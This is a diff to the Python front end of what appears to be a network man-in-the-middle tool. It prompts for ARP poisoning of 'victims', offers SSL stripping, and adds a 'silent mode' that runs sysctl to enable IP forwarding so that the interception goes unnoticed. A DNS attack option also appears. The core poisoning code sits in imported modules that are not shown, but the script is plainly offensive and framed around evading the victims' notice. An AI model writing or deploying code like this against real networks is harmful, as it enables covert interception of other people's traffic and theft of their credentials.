@@ -1,12 +1,6 @@
-# some ideas for user dialogues
-import parser
-import scan
-# import validators
-import arp, ssl
+import arp, ssl, scan, parser
 from urllib.parse import urlparse
-import sys
-
-args = parser.import_args()
+import os, sys
 
 
 def is_valid_link(x):
@@ -93,6 +87,7 @@ def yes_no():
 
 
 interface, hosts = discover()
+args = parser.import_args()
 
 if args.ARP:
     interval = args.ARP
@@ -100,7 +95,7 @@ if args.ARP:
 
     # some threads around here i guess
     
-    print("Want to do SSL strip on the victims while ARP poisoning them? Y/N \n")
+    print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
     answr = yes_no()
 
     if answr is 0:
@@ -112,13 +107,22 @@ if args.ARP:
 
     spacing()
 
+    # if silent
+
+    if args.silent:
+        print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
+        os.system("sysctl -w net.ipv4.ip_forward=1")
+    else:
+        print("Silent mode off. The victims might notice the attack and take measures against it.")
+        os.system("sysctl -w net.ipv4.ip_forward=0")
+
+    spacing()
+
     print("Begin ARP poisoning")
 
     spacing()
 
     arp.Poison(interface, hosts, interval).poison()
-
-
 
 elif args.DNS:
     websites = args.DNS
